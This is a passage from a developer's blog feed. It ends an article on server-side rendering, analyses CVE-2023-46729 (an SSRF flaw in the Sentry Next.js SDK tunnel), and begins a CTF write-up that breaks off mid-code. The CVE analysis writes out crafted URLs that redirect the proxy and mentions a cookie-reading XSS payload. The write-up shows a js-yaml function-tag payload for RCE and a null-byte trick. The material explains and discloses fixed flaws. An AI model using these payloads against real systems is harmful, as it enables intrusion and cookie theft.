solution we mentioned earlier seems perfect, right? It allows us to render the page on the server, solving the performance issues related to SEO and first paint, while also enabling client-side hydration for a SPA-like experience.</p><p>However, there are still areas for continuous improvement.</p><p>We briefly mentioned a small issue with hydration earlier, where until hydration is complete, although the page is visible, it is not interactive. For example, typing in an input may not have any response because the event handler hasn’t been attached yet or the component hasn’t finished rendering.</p><p>So, what can we do about this? Another term comes into play: <a href="https://www.patterns.dev/react/progressive-hydration">Progressive Hydration</a>. Instead of hydrating the entire page at once, we can do it block by block, prioritizing the more important ones. This way, users can interact immediately after the important blocks are hydrated, and then the less important blocks can be hydrated.</p><p>Furthermore, you may notice that certain sections of a webpage don’t need hydration at all because they are static, such as a footer that remains the same throughout. In such cases, we can use another technique called <a href="https://www.patterns.dev/react/react-selective-hydration">Selective Hydration</a> to pre-render the non-hydratable sections.</p><p>In 2019, Katie Sylor-Miller, the frontend architect at Etsy, proposed the <a href="https://jasonformat.com/islands-architecture/">Islands Architecture</a>, which views a webpage as composed of different islands:</p><p><img src="/img/server-side-rendering-ssr-and-isomorphic/p7.png" alt="Islands Architecture"></p><p>The above image illustrates the concept of selective hydration that was just discussed. When we adopt this architecture and combine it with selective hydration and other techniques, we can render faster and achieve better performance.</p><p>For example, <a href="https://docs.astro.build/en/concepts/islands/">Astro</a> uses this architecture, where the entire page is static and only the interactive parts are separated into individual islands:</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">MyReactComponent</span></span> <span class="token attr-name"><span class="token namespace">client:</span>load</span> <span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>React is also moving in this direction with server components, which is quite similar. By dividing the page into server and client components and determining which ones require state and which ones don’t, we can directly render the unnecessary components on the server and send them to the client, while maintaining the previous approach for the required components.</p><p>This approach does indeed accelerate web pages, but at the same time, development becomes more complex. There are more things to consider, and debugging becomes less convenient. I will share some insights and details in a future article.</p><h2><span id="conclusion">Conclusion</span></h2><p>I personally started exploring various frontend tools relatively late. Excluding the early days of using FrontPage or Dreamweaver, I began writing jQuery around 2012. Then, I observed the development of various frontend technologies but didn’t actually work with them. I had considered learning AngularJS (which was popular at the time) and Ember.js, but I was lazy.</p><p>It wasn’t until 2015 that I started working with React when it was just starting to gain popularity in Taiwan.</p><p>So, I didn’t participate in the era of Backbone.js and similar technologies. While writing this article, I researched a lot of information, which was quite interesting. It helped me fill in the gap of that period in history that I missed.</p><p>During my research, I also discovered that Yahoo! was truly a pioneer in frontend web development. For example, <a href="https://blog.huli.tw/2022/05/23/en/atomic-css-and-tailwind-css/">Atomic CSS</a> originated from Yahoo!, and I also found out that Yahoo! was already using a Universal JavaScript web framework back in 2012.</p><p>If you have a different perspective on SSR or feel that I have misunderstood the historical context, feel free to write a new article to discuss it with me. After all, some concepts cannot be explained in a few words, and writing an article provides a more comprehensive explanation. Alternatively, we can also discuss it through comments.</p><h2><span id="references">References</span></h2><ol><li><a href="https://en.wikipedia.org/wiki/Ajax_(programming)">AJAX</a></li><li><a href="https://www.sencha.com/blog/a-fond-farewell-to-yui/">A Fond Farewell to YUI</a></li><li><a href="https://en.wikipedia.org/wiki/XMLHttpRequest">XMLHttpRequest</a></li><li><a href="https://en.wikipedia.org/wiki/Isomorphic_JavaScript">Isomorphic JavaScript</a></li><li><a href="https://deno.com/blog/the-future-and-past-is-server-side-rendering">The Future (and the Past) of the Web is Server Side Rendering</a></li><li><a href="https://www.youtube.com/watch?v=k-A2VfuUROg&ab_channel=ChromeforDevelopers">Rendering on the Web: Performance Implications of Application Architecture (Google I&#x2F;O ’19)</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;Did you know that when you discuss SSR with your friends, it’s highly likely that your understanding of SSR differs? Let’s take a few scenarios. Which ones do you consider as SSR?&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Generating the view from the backend using PHP.&lt;/li&gt;
&lt;li&gt;Frontend is a React-based SPA, but if the backend detects a search engine, it switches to a different template that is specifically designed for search engines instead of the React-rendered page.&lt;/li&gt;
&lt;li&gt;Frontend is a React-based SPA, but it uses Prerender to render the page as HTML and then serves it to the search engine (regular users still get the SPA experience). The difference from the previous scenario is that the view seen by users and search engines is mostly the same.&lt;/li&gt;
&lt;li&gt;Frontend is a React-based SPA, and the backend uses &lt;code&gt;renderToString&lt;/code&gt; to render React into a string, but there is no data. The data is fetched on the frontend.&lt;/li&gt;
&lt;li&gt;Frontend is a React-based SPA, and the backend makes API calls to fetch data for each page. After fetching the data, it calls &lt;code&gt;renderToString&lt;/code&gt; to output HTML. On the client-side, hydration is performed to make the page interactive.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Some people believe that any view generated by the backend is considered SSR, so all scenarios 1 to 5 are SSR. Others think that the frontend must be an SPA for it to be called SSR, so scenarios 2 to 5 are SSR. Yet, some people consider hydration as the key aspect of SSR, so only scenario 5 (or 45) is SSR.&lt;/p&gt;</summary>
    
    
    
    <category term="Front-end" scheme="https://blog.huli.tw/categories/Front-end/"/>
    
    
    <category term="Front-end" scheme="https://blog.huli.tw/tags/Front-end/"/>
    
  </entry>
  
  
  
  <entry>
    <title>Analysis of CVE-2023-46729: URL Rewrite Vulnerability in Sentry Next.js SDK</title>
    <link href="https://blog.huli.tw/2023/11/13/en/sentry-nextjs-sdk-cve-2023-46729/"/>
    <id>https://blog.huli.tw/2023/11/13/en/sentry-nextjs-sdk-cve-2023-46729/</id>
    <published>2023-11-13T06:40:00.000Z</published>
    <updated>2023-11-13T13:22:53.411Z</updated>
    
    <content type="html"><![CDATA[<p>On November 9, 2023, Sentry published an article on their blog titled <a href="https://blog.sentry.io/next-js-sdk-security-advisory-cve-2023-46729/">Next.js SDK Security Advisory - CVE-2023-46729</a>. The article discusses the details of the CVE-2023-46729 vulnerability, including its cause, discovery time, and patching time.</p><p>Although the vulnerability was officially announced on 11&#x2F;9, it was actually fixed in version 7.77.0 released on 10&#x2F;31. Some time was given to developers to patch the vulnerability.</p><p>Now let’s briefly discuss the cause and attack method of this vulnerability.</p><span id="more"></span><h2><span id="vulnerability-analysis">Vulnerability Analysis</span></h2><p>There is also a more technical explanation on GitHub: <a href="https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-2rmr-xw8m-22q9">CVE-2023-46729: SSRF via Next.js SDK tunnel endpoint</a></p><p>You can see this paragraph:</p><blockquote><p>An unsanitized input of Next.js SDK tunnel endpoint allows sending HTTP requests to arbitrary URLs and reflecting the response back to the user.</p></blockquote><p>In Sentry, there is a feature called “tunnel,” and this image from the <a href="https://docs.sentry.io/platforms/javascript/troubleshooting/#dealing-with-ad-blockers">official documentation</a> perfectly explains why tunneling is needed:</p><p><img src="/img/sentry-nextjs-sdk-cve-2023-46729/p1.png" alt="tunnel"></p><p>Without tunneling, requests sent to Sentry would be directly sent through the browser on the frontend. However, these requests sent directly to Sentry may be blocked by ad blockers, preventing Sentry from receiving the data. If tunneling is enabled, the request is first sent to the user’s own server and then forwarded to Sentry. This way, the request becomes a same-origin request and will not be blocked by ad blockers.</p><p>In the Sentry SDK specifically designed for Next.js, a feature called <a href="https://nextjs.org/docs/app/api-reference/next-config-js/rewrites">rewrite</a> is used. Here is an example from the official documentation:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">async</span> <span class="token function">rewrites</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token punctuation">[</span>      <span class="token punctuation">&#123;</span>        <span class="token literal-property property">source</span><span class="token operator">:</span> <span class="token string">'/blog'</span><span class="token punctuation">,</span>        <span class="token literal-property property">destination</span><span class="token operator">:</span> <span class="token string">'https://example.com/blog'</span><span class="token punctuation">,</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token punctuation">&#123;</span>        <span class="token literal-property property">source</span><span class="token operator">:</span> <span class="token string">'/blog/:slug'</span><span class="token punctuation">,</span>        <span class="token literal-property property">destination</span><span class="token operator">:</span> <span class="token string">'https://example.com/blog/:slug'</span><span class="token punctuation">,</span> <span class="token comment">// Matched parameters can be used in the destination</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Next.js rewrite can be divided into two types: internal and external. The latter is more like a proxy, as it can directly redirect the request to an external website and display the response.</p><p>The implementation of the Next.js Sentry SDK is in <a href="https://github.com/getsentry/sentry-javascript/blob/7.69.0/packages/nextjs/src/config/withSentryConfig.ts#L98">sentry-javascript&#x2F;packages&#x2F;nextjs&#x2F;src&#x2F;config&#x2F;withSentryConfig.ts</a>:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/** * Injects rewrite rules into the Next.js config provided by the user to tunnel * requests from the `tunnelPath` to Sentry. * * See https://nextjs.org/docs/api-reference/next.config.js/rewrites. */</span><span class="token keyword">function</span> <span class="token function">setUpTunnelRewriteRules</span><span class="token punctuation">(</span><span class="token parameter"><span class="token literal-property property">userNextConfig</span><span class="token operator">:</span> NextConfigObject<span class="token punctuation">,</span> <span class="token literal-property property">tunnelPath</span><span class="token operator">:</span> string</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> originalRewrites <span class="token operator">=</span> userNextConfig<span class="token punctuation">.</span>rewrites<span class="token punctuation">;</span>  <span class="token comment">// This function doesn't take any arguments at the time of writing but we future-proof</span>  <span class="token comment">// here in case Next.js ever decides to pass some</span>  userNextConfig<span class="token punctuation">.</span><span class="token function-variable function">rewrites</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>args<span class="token operator">:</span> unknown<span class="token punctuation">[</span><span class="token punctuation">]</span></span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> injectedRewrite <span class="token operator">=</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// Matched rewrite routes will look like the following: `[tunnelPath]?o=[orgid]&amp;p=[projectid]`</span>      <span class="token comment">// Nextjs will automatically convert `source` into a regex for us</span>      <span class="token literal-property property">source</span><span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>tunnelPath<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">(/?)</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>      <span class="token literal-property property">has</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">&#123;</span>          <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'query'</span><span class="token punctuation">,</span>          <span class="token literal-property property">key</span><span class="token operator">:</span> <span class="token string">'o'</span><span class="token punctuation">,</span> <span class="token comment">// short for orgId - we keep it short so matching is harder for ad-blockers</span>          <span class="token literal-property property">value</span><span class="token operator">:</span> <span class="token string">'(?&lt;orgid>.*)'</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span>          <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'query'</span><span class="token punctuation">,</span>          <span class="token literal-property property">key</span><span class="token operator">:</span> <span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token comment">// short for projectId - we keep it short so matching is harder for ad-blockers</span>          <span class="token literal-property property">value</span><span class="token operator">:</span> <span class="token string">'(?&lt;projectid>.*)'</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token literal-property property">destination</span><span class="token operator">:</span> <span class="token string">'https://o:orgid.ingest.sentry.io/api/:projectid/envelope/?hsts=0'</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> originalRewrites <span class="token operator">!==</span> <span class="token string">'function'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token punctuation">[</span>injectedRewrite<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// @ts-expect-error Expected 0 arguments but got 1 - this is from the future-proofing mentioned above, so we don't care about it</span>    <span class="token keyword">const</span> originalRewritesResult <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">originalRewrites</span><span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>originalRewritesResult<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token punctuation">[</span>injectedRewrite<span class="token punctuation">,</span> <span class="token operator">...</span>originalRewritesResult<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>        <span class="token operator">...</span>originalRewritesResult<span class="token punctuation">,</span>        <span class="token literal-property property">beforeFiles</span><span class="token operator">:</span> <span class="token punctuation">[</span>injectedRewrite<span class="token punctuation">,</span> <span class="token operator">...</span><span class="token punctuation">(</span>originalRewritesResult<span class="token punctuation">.</span>beforeFiles <span class="token operator">||</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>The crucial part is this section:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> injectedRewrite <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// Matched rewrite routes will look like the following: `[tunnelPath]?o=[orgid]&amp;p=[projectid]`</span>  <span class="token comment">// Nextjs will automatically convert `source` into a regex for us</span>  <span class="token literal-property property">source</span><span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>tunnelPath<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">(/?)</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>  <span class="token literal-property property">has</span><span class="token operator">:</span> <span class="token punctuation">[</span>    <span class="token punctuation">&#123;</span>      <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'query'</span><span class="token punctuation">,</span>      <span class="token literal-property property">key</span><span class="token operator">:</span> <span class="token string">'o'</span><span class="token punctuation">,</span> <span class="token comment">// short for orgId - we keep it short so matching is harder for ad-blockers</span>      <span class="token literal-property property">value</span><span class="token operator">:</span> <span class="token string">'(?&lt;orgid>.*)'</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#123;</span>      <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'query'</span><span class="token punctuation">,</span>      <span class="token literal-property property">key</span><span class="token operator">:</span> <span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token comment">// short for projectId - we keep it short so matching is harder for ad-blockers</span>      <span class="token literal-property property">value</span><span class="token operator">:</span> <span class="token string">'(?&lt;projectid>.*)'</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token literal-property property">destination</span><span class="token operator">:</span> <span class="token string">'https://o:orgid.ingest.sentry.io/api/:projectid/envelope/?hsts=0'</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>It determines the final URL to redirect to based on the <code>o</code> and <code>p</code> query string parameters.</p><p>The problem here is that both of these parameters use the <code>.*</code> regular expression, which matches any character. In other words, for the following URL:</p><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;huli.tw&#x2F;tunnel?o&#x3D;abc&amp;p&#x3D;def<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>It will proxy to:</p><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;oabc.ingest.sentry.io&#x2F;api&#x2F;def&#x2F;envelope&#x2F;?hsts&#x3D;0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>It looks fine, but what if it’s like this?</p><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;huli.tw&#x2F;tunnel?o&#x3D;example.com%23&amp;p&#x3D;def<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>%23</code> is the URL-encoded result of <code>#</code>. It will be proxied to:</p><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;oexample.com#.ingest.sentry.io&#x2F;api&#x2F;def&#x2F;envelope&#x2F;?hsts&#x3D;0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>We use <code>#</code> to include the original hostname as part of the hash and successfully change the destination of the proxy. However, the leading <code>o</code> is a bit annoying. Let’s get rid of it by adding <code>@</code> at the beginning:</p><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;huli.tw&#x2F;tunnel?o&#x3D;@example.com%23&amp;p&#x3D;def<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>It becomes:</p><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;o@example.com#.ingest.sentry.io&#x2F;api&#x2F;def&#x2F;envelope&#x2F;?hsts&#x3D;0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>In this way, an attacker can use the <code>o</code> parameter to change the destination of the proxy and redirect the request anywhere. As mentioned earlier, this rewrite feature directly returns the response. So when a user visits <code>https://huli.tw/tunnel?o=@example.com%23&amp;p=def</code>, they will see the response of <code>example.com</code>.</p><p>In other words, if an attacker redirects the request to their own website, they can output <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>, turning it into an XSS vulnerability.</p><p>If the attacker redirects the request to other internal web pages like <code>https://localhost:3001</code>, it becomes an SSRF vulnerability (but the target must support HTTPS).</p><p>As for the fix, it’s simple. Just add some restrictions to the regex. Finally, Sentry adjusted it to <a href="https://github.com/getsentry/sentry-javascript/pull/9416/files">only allow digits</a>:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span>  <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'query'</span><span class="token punctuation">,</span>  <span class="token literal-property property">key</span><span class="token operator">:</span> <span class="token string">'o'</span><span class="token punctuation">,</span> <span class="token comment">// short for orgId - we keep it short so matching is harder for ad-blockers</span>  <span class="token literal-property property">value</span><span class="token operator">:</span> <span class="token string">'(?&lt;orgid>\\d*)'</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>This issue has been fixed in version 7.77.0 and later.</p><h2><span id="conclusion">Conclusion</span></h2><p>This vulnerability is really simple and easy to reproduce. Just find the fix commit and take a look at the code to understand how to exploit it.</p><p>In summary, when doing URL rewriting, you really need to be cautious, as it’s easy to encounter issues (especially when you’re not just rewriting the path but the entire URL).</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;On November 9, 2023, Sentry published an article on their blog titled &lt;a href=&quot;https://blog.sentry.io/next-js-sdk-security-advisory-cve-2023-46729/&quot;&gt;Next.js SDK Security Advisory - CVE-2023-46729&lt;/a&gt;. The article discusses the details of the CVE-2023-46729 vulnerability, including its cause, discovery time, and patching time.&lt;/p&gt;
&lt;p&gt;Although the vulnerability was officially announced on 11&amp;#x2F;9, it was actually fixed in version 7.77.0 released on 10&amp;#x2F;31. Some time was given to developers to patch the vulnerability.&lt;/p&gt;
&lt;p&gt;Now let’s briefly discuss the cause and attack method of this vulnerability.&lt;/p&gt;</summary>
    
    
    
    <category term="Security" scheme="https://blog.huli.tw/categories/Security/"/>
    
    
    <category term="Security" scheme="https://blog.huli.tw/tags/Security/"/>
    
  </entry>
  
  
  
  <entry>
    <title>HITCON CTF 2023 and SECCON CTF 2023 Writeup</title>
    <link href="https://blog.huli.tw/2023/09/23/en/hitcon-seccon-ctf-2023-writeup/"/>
    <id>https://blog.huli.tw/2023/09/23/en/hitcon-seccon-ctf-2023-writeup/</id>
    <published>2023-09-23T07:40:00.000Z</published>
    <updated>2023-09-23T08:17:56.034Z</updated>
    
    <content type="html"><![CDATA[<p>Both of these competitions had many interesting but challenging problems. I really learned a lot.</p><p>Keyword list:</p><ol><li>nim json, null byte</li><li>nim request smuggling</li><li>js-yaml</li><li>web worker</li><li>blob URL</li><li>meta redirect</li><li>file protocol &amp; .localhost domain</li><li>sxg: Signed Exchanges</li><li>431 CSP bypass</li><li>DOM clobbering document.body</li><li>ejs delimiter</li><li>Node.js + Deno prototype pollution gadget</li><li>XSleaks golang sort</li></ol><span id="more"></span><h2><span id="hitcon-ctf-2023">HITCON CTF 2023</span></h2><p>Recently, it seems rare to see web challenges with less than 10 solves for each problem. The last time I saw such a competition was probably DiceCTF. However, I think the difficulty is secondary. The main point is to have fun, find it interesting, and learn new things. These problems, in my opinion, clearly achieved that.</p><p>First, here are the write-ups from two authors.</p><ol><li><a href="https://blog.splitline.tw/hitcon-ctf-2023-challenges-zh_tw/">https://blog.splitline.tw/hitcon-ctf-2023-challenges-zh_tw&#x2F;</a></li><li><a href="https://github.com/maple3142/My-CTF-Challenges/#hitcon-ctf-2023">https://github.com/maple3142/My-CTF-Challenges/#hitcon-ctf-2023</a></li></ol><p>Both authors wrote detailed write-ups. Here, I will just record some key points after reading them.</p><h3><span id="login-system-7-solves">Login System (7 solves)</span></h3><p>This challenge has two servers: one in Node.js and the other in Nim. Basically, most of the functionality is implemented in the Nim server. You can log in, register, and change passwords. User data is stored in a YAML file, and the goal is to achieve RCE (Remote Code Execution).</p><p>The first vulnerability is request smuggling. Node.js accepts <code>Transfer-Encoding: CHUNKED</code>, but Nim only looks at the <code>chunk</code>. This difference can be exploited for smuggling purposes.</p><p>But what can be done after smuggling?</p><p>The second vulnerability is related to Nim’s behavior with JSON. By setting a field to a very large number, Nim treats it as a <code>RawNumber</code>. When updating, it won’t include quotes. This can be used for JSON injection.</p><p>The third vulnerability is that, with JSON injection, you can use the functionality of js-yaml to create an object with a JS function. Finally, by calling <code>toString</code> on this object during rendering, RCE can be achieved.</p><p>It would look something like this:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">privilegeLevel</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>  <span class="token literal-property property">toString</span><span class="token operator">:</span> <span class="token operator">!</span><span class="token operator">&lt;</span>tag<span class="token operator">:</span>yaml<span class="token punctuation">.</span>org<span class="token punctuation">,</span><span class="token number">2002</span><span class="token operator">:</span>js<span class="token operator">/</span><span class="token keyword">function</span><span class="token operator">></span> <span class="token string">"function ()&#123;console.log('hi')&#125;"</span><span class="token punctuation">&#125;</span><span class="token literal-property property">access</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string-property property">'profile'</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token literal-property property">register</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token literal-property property">login</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>Oh, by the way, there is another vulnerability related to Nim’s file reading. The filename can be truncated using a null byte: <code>test.yaml\u0000</code></p><h3><span id="canvas-4-solves">Canvas (4 solves)</span></h3><p>This challenge is very interesting!</p><p>In simple terms, it throws your code into a worker to execute it. Inside the worker, there are some protective measures that prevent you from accessing <code>globalThis</code>. Even if you manage to get XSS within the worker, the only thing you can do is post a message to the main thread. However, the result goes through <code>setHTML</code> and is filtered by the browser’s Sanitizer API.</p><p>The worker’s sandbox is quite interesting. It looks something like this:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">allKeys</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> keys <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span>obj <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    keys <span class="token operator">=</span> keys<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyNames</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span>    keys <span class="token operator">=</span> keys<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyDescriptors</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    obj <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">getPrototypeOf</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token operator">...</span><span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span>keys<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">hardening</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> fnCons <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token keyword">function</span><span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>    <span class="token parameter">f</span> <span class="token operator">=></span> f<span class="token punctuation">.</span>constructor  <span class="token punctuation">)</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> c <span class="token keyword">of</span> fnCons<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    Object<span class="token punctuation">.</span><span class="token function">defineProperty</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>prototype<span class="token punctuation">,</span> <span class="token string">'constructor'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>      <span class="token function-variable function">get</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Nope'</span><span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token function-variable function">set</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Nope'</span><span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token literal-property property">configurable</span><span class="token operator">:</span> <span class="token boolean">false</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">const</span> cons <span class="token operator">=</span> <span class="token punctuation">[</span>Object<span class="token punctuation">,</span> Array<span class="token punctuation">,</span> Number<span class="token punctuation">,</span> String<span class="token punctuation">,</span> Boolean<span class="token punctuation">,</span> Date<span class="token 